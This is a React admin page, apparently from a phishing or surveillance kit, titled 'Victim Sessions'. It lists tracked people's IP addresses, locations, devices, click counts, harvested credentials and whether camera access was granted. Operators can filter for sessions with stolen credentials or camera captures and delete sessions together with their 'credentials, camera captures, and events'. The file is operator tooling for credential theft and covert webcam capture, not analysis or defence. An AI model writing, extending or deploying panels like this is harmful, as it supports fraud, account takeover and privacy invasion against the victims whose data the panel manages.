import React, { useState, useEffect, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import { Box, Typography, TextField, Select, MenuItem, FormControl, InputLabel, Chip, IconButton, Table, TableBody, TableCell, TableContainer, TableHead, TableRow, Paper, TablePagination, Button, Dialog, DialogTitle, DialogContent, DialogActions, Grid, Avatar, Tooltip } from '@mui/material';
import { DataGrid } from '@mui/x-data-grid';
import RefreshIcon from '@mui/icons-material/Refresh';
import DeleteIcon from '@mui/icons-material/Delete';
import VisibilityIcon from '@mui/icons-material/Visibility';
import FileDownloadIcon from '@mui/icons-material/FileDownload';
import FilterListIcon from '@mui/icons-material/FilterList';
import PublicIcon from '@mui/icons-material/Public';
import DevicesIcon from '@mui/icons-material/Devices';
import axios from 'axios';

export default function SessionsPage() {
  const navigate = useNavigate();
  const [sessions, setSessions] = useState([]);
  const [total, setTotal] = useState(0);
  const [page, setPage] = useState(0);
  const [limit, setLimit] = useState(20);
  const [search, setSearch] = useState('');
  const [status, setStatus] = useState('');
  const [country, setCountry] = useState('');
  const [hasCredentials, setHasCredentials] = useState('');
  const [hasCamera, setHasCamera] = useState('');
  const [loading, setLoading] = useState(false);
  const [deleteDialog, setDeleteDialog] = useState(null);
  const [selected, setSelected] = useState([]);
  const [showFilters, setShowFilters] = useState(false);

  const fetchSessions = useCallback(async () => {
    setLoading(true);
    try {
      const params = { page: page + 1, limit, sortBy: '-createdAt' };
      if (search) params.search = search;
      if (status) params.status = status;
      if (country) params.country = country;
      if (hasCredentials) params.hasCredentials = hasCredentials;
      if (hasCamera) params.hasCamera = hasCamera;
      const res = await axios.get('/api/admin/sessions', { params });
      setSessions(res.data.sessions);
      setTotal(res.data.pagination.total);
    } catch(e) { console.error(e); }
    finally { setLoading(false); }
  }, [page, limit, search, status, country, hasCredentials, hasCamera]);

  useEffect(() => { fetchSessions(); }, [fetchSessions]);

  const handleDelete = async (id) => {
    try {
      await axios.delete(`/api/admin/sessions/${id}`);
      setDeleteDialog(null);
      setSelected(prev => prev.filter(s => s !== id));
      fetchSessions();
    } catch(e) { console.error(e); }
  };

  const handleBulkDelete = async () => {
    if (selected.length === 0) return;
    try {
      await axios.post('/api/admin/sessions/bulk-delete', { ids: selected });
      setSelected([]);
      fetchSessions();
    } catch(e) { console.error(e); }
  };

  const columns = [
    { field: 'sessionId', headerName: 'Session ID', width: 160, renderCell: (params) => 
      <Typography sx={{ color: '#00f0ff', fontFamily: 'monospace', fontSize: '0.75rem', fontWeight: 600 }}>{params.value?.substring(0, 16)}...</Typography> },
    { field: 'ipAddress', headerName: 'IP Address', width: 130,
      renderCell: (params) => <Typography sx={{ color: '#aaa', fontFamily: 'monospace', fontSize: '0.8rem' }}>{params.value || 'N/A'}</Typography> },
    { field: 'browser', headerName: 'Browser', width: 100, renderCell: (params) => <Chip label={params.value || '?'} size="small" sx={{ bgcolor: 'rgba(0,240,255,0.08)', color: '#00f0ff', fontSize: '0.7rem' }} /> },
    { field: 'os', headerName: 'OS', width: 100, renderCell: (params) => <Chip label={params.value || '?'} size="small" sx={{ bgcolor: 'rgba(255,255,255,0.04)', color: '#999', fontSize: '0.7rem' }} /> },
    { field: 'deviceType', headerName: 'Device', width: 90, renderCell: (params) => {
      const icons = { desktop: '🖥️', mobile: '📱', tablet: '📟', unknown: '❓' };
      return <Typography sx={{ fontSize: '1rem' }}>{icons[params.value] || icons.unknown}</Typography>;
    }},
    { field: 'location', headerName: 'Location', width: 150, renderCell: (params) => {
      const geo = params.row.geolocation;
      return <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5 }}>
        <PublicIcon sx={{ color: '#666', fontSize: 14 }} />
        <Typography sx={{ color: '#aaa', fontSize: '0.78rem' }}>{[geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown'}</Typography>
      </Box>;
    }},
    { field: 'isOnline', headerName: 'Status', width: 90, renderCell: (params) => 
      <Chip label={params.value ? '🟢 Online' : '⚫ Offline'} size="small" sx={{ 
        bgcolor: params.value ? 'rgba(0,255,136,0.12)' : 'rgba(255,255,255,0.03)', 
        color: params.value ? '#00ff88' : '#666', 
        fontWeight: 600,
        fontSize: '0.7rem'
      }} />
    },
    { field: 'clickCount', headerName: 'Clicks', width: 70, type: 'number',
      renderCell: (params) => <Chip label={params.value || 0} size="small" sx={{ bgcolor: 'rgba(0,240,255,0.08)', color: '#00f0ff', fontWeight: 600 }} /> },
    { field: 'credentials', headerName: 'Creds', width: 70, renderCell: (params) => {
      const count = params.value?.length || 0;
      return <Chip label={count} size="small" sx={{ bgcolor: count > 0 ? 'rgba(255,0,85,0.15)' : 'rgba(255,255,255,0.03)', color: count > 0 ? '#ff0055' : '#666', fontWeight: 700 }} />;
    }},
    { field: 'cameraAccessGranted', headerName: '📷', width: 60, renderCell: (params) => 
      <Typography sx={{ fontSize: '1.1rem' }}>{params.value ? '📷' : '—'}</Typography>
    },
    { field: 'timeOnSite', headerName: 'Time', width: 80, renderCell: (params) => {
      const t = params.value || 0;
      return <Typography sx={{ color: '#888', fontSize: '0.75rem' }}>{Math.floor(t / 60)}m {t % 60}s</Typography>;
    }},
    { field: 'createdAt', headerName: 'First Seen', width: 150, renderCell: (params) => 
      <Typography sx={{ color: '#888', fontSize: '0.75rem' }}>{new Date(params.value).toLocaleString()}</Typography>
    },
    { field: 'actions', headerName: 'Actions', width: 90, renderCell: (params) => (
      <Box sx={{ display: 'flex', gap: 0.3 }}>
        <Tooltip title="View Details">
          <IconButton size="small" onClick={() => navigate(`/admin/sessions/${params.row._id}`)} sx={{ color: '#00f0ff', '&:hover': { bgcolor: 'rgba(0,240,255,0.1)' } }}>
            <VisibilityIcon sx={{ fontSize: 17 }} />
          </IconButton>
        </Tooltip>
        <Tooltip title="Delete Session">
          <IconButton size="small" onClick={() => setDeleteDialog(params.row._id)} sx={{ color: '#ff0055', '&:hover': { bgcolor: 'rgba(255,0,85,0.1)' } }}>
            <DeleteIcon sx={{ fontSize: 17 }} />
          </IconButton>
        </Tooltip>
      </Box>
    )}
  ];

  return (
    <Box>
      {/* Header */}
      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 3, flexWrap: 'wrap', gap: 1 }}>
        <Box>
          <Typography variant="h4" sx={{ color: '#fff', fontWeight: 700, fontSize: '1.4rem' }}>
            👥 Victim Sessions
          </Typography>
          <Typography sx={{ color: '#888', fontSize: '0.85rem', mt: 0.2 }}>
            {total} total sessions · Page {page + 1} of {Math.ceil(total / limit) || 1}
          </Typography>
        </Box>
        <Box sx={{ display: 'flex', gap: 1 }}>
          {selected.length > 0 && (
            <Button variant="outlined" size="small" startIcon={<DeleteIcon />} onClick={handleBulkDelete} sx={{ borderColor: '#ff0055', color: '#ff0055' }}>
              Delete {selected.length}
            </Button>
          )}
          <Button variant="outlined" size="small" startIcon={<FilterListIcon />} onClick={() => setShowFilters(!showFilters)}
            sx={{ borderColor: showFilters ? '#00f0ff' : '#555', color: showFilters ? '#00f0ff' : '#aaa' }}>
            Filters
          </Button>
          <Button variant="outlined" size="small" startIcon={<RefreshIcon />} onClick={fetchSessions} sx={{ borderColor: '#555', color: '#aaa' }}>
            Refresh
          </Button>
        </Box>
      </Box>

      {/* Filters */}
      {showFilters && (
        <Paper sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.06)', p: 2, mb: 3, borderRadius: 2 }}>
          <Grid container spacing={2} alignItems="center">
            <Grid item xs={12} sm={3}>
              <TextField fullWidth size="small" placeholder="Search IP, location, browser..." value={search} onChange={(e) => { setSearch(e.target.value); setPage(0); }}
                sx={{ input: { color: '#fff' }, '& .MuiOutlinedInput-root fieldset': { borderColor: 'rgba(255,255,255,0.15)' } }} />
            </Grid>
            <Grid item xs={6} sm={2}>
              <FormControl fullWidth size="small">
                <InputLabel sx={{ color: '#888' }}>Status</InputLabel>
                <Select value={status} label="Status" onChange={(e) => { setStatus(e.target.value); setPage(0); }} sx={{ color: '#fff' }}>
                  <MenuItem value="">All</MenuItem>
                  <MenuItem value="online">🟢 Online</MenuItem>
                  <MenuItem value="offline">⚫ Offline</MenuItem>
                </Select>
              </FormControl>
            </Grid>
            <Grid item xs={6} sm={2}>
              <FormControl fullWidth size="small">
                <InputLabel sx={{ color: '#888' }}>Credentials</InputLabel>
                <Select value={hasCredentials} label="Credentials" onChange={(e) => { setHasCredentials(e.target.value); setPage(0); }} sx={{ color: '#fff' }}>
                  <MenuItem value="">All</MenuItem>
                  <MenuItem value="true">🔑 Has Credentials</MenuItem>
                </Select>
              </FormControl>
            </Grid>
            <Grid item xs={6} sm={2}>
              <FormControl fullWidth size="small">
                <InputLabel sx={{ color: '#888' }}>Camera</InputLabel>
                <Select value={hasCamera} label="Camera" onChange={(e) => { setHasCamera(e.target.value); setPage(0); }} sx={{ color: '#fff' }}>
                  <MenuItem value="">All</MenuItem>
                  <MenuItem value="true">📷 Camera Access</MenuItem>
                </Select>
              </FormControl>
            </Grid>
            <Grid item xs={6} sm={1.5}>
              <Chip label={`${total} results`} sx={{ bgcolor: 'rgba(0,240,255,0.08)', color: '#00f0ff', width: '100%' }} />
            </Grid>
          </Grid>
        </Paper>
      )}

      {/* Data Table */}
      <Paper sx={{ bgcolor: '#0d1117', border: '1px solid rgba(255,255,255,0.06)', height: 620, borderRadius: 2, overflow: 'hidden' }}>
        <DataGrid
          rows={sessions}
          columns={columns}
          getRowId={(row) => row._id}
          rowCount={total}
          loading={loading}
          pageSizeOptions={[10, 20, 50]}
          paginationModel={{ page, pageSize: limit }}
          onPaginationModelChange={(m) => { setPage(m.page); setLimit(m.pageSize); }}
          paginationMode="server"
          checkboxSelection
          onRowSelectionModelChange={(ids) => setSelected(ids)}
          sx={{ 
            color: '#ccc', border: 'none',
            '& .MuiDataGrid-cell': { borderColor: 'rgba(255,255,255,0.04)' },
            '& .MuiDataGrid-columnHeaders': { bgcolor: 'rgba(255,255,255,0.02)', color: '#888', fontWeight: 600 },
            '& .MuiDataGrid-footerContainer': { borderTop: '1px solid rgba(255,255,255,0.06)' },
            '& .MuiDataGrid-row': { '&:hover': { bgcolor: 'rgba(0,240,255,0.03)' } },
            '& .MuiCheckbox-root': { color: '#555' }
          }}
        />
      </Paper>

      {/* Delete Confirmation */}
      <Dialog open={!!deleteDialog} onClose={() => setDeleteDialog(null)}>
        <DialogTitle sx={{ bgcolor: '#0d1117', color: '#fff', borderBottom: '1px solid rgba(255,255,255,0.06)' }}>
          Confirm Delete Session
        </DialogTitle>
        <DialogContent sx={{ bgcolor: '#0d1117', color: '#aaa', py: 3 }}>
          This will permanently delete this session and all associated credentials, camera captures, and events. This action cannot be undone.
        </DialogContent>
        <DialogActions sx={{ bgcolor: '#0d1117', p: 2, borderTop: '1px solid rgba(255,255,255,0.06)' }}>
          <Button onClick={() => setDeleteDialog(null)} sx={{ color: '#888' }}>Cancel</Button>
          <Button onClick={() => handleDelete(deleteDialog)} variant="contained" sx={{ bgcolor: '#ff0055', '&:hover': { bgcolor: '#cc0044' } }}>
            Delete Session
          </Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
}